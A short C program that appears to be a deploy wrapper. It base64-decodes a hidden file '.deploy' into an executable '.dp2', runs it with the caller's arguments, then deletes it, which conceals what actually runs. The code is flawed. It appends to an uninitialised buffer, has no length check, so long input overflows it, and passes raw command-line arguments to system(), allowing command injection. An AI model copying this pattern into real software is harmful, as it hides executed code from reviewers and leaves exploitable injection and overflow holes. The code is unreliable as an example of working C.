#include <stdio.h>
#include <string.h>
int main(int argc , char*argv[]){
  system("cat .deploy | base64 --decode > .dp2");
  system("chmod 0755 .dp2");
  char buf[2000];
  strcat(buf,"./.dp2 -p 'COMMAND=deploy' ");
  int i=1;
  for (;i<argc;i++){
     strcat(buf,argv[i]);
     strcat(buf, "  ");
  }
  system(buf);
  system( "rm -rf .dp2");
}
